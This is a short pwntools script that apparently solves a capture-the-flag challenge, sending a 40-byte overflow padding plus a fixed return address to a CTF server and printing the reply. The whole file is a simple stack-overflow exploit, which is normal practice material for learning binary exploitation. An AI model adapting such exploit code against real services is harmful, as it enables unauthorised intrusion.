from pwn import *

target = remote("pwn.katagaitai-ctf.com", 9002)

# win = 

payload = b"A" * 40
payload += p64(0x4015b9)
#payload += p64()

target.sendline(payload)
print(target.recvall().decode())
# target.interactive()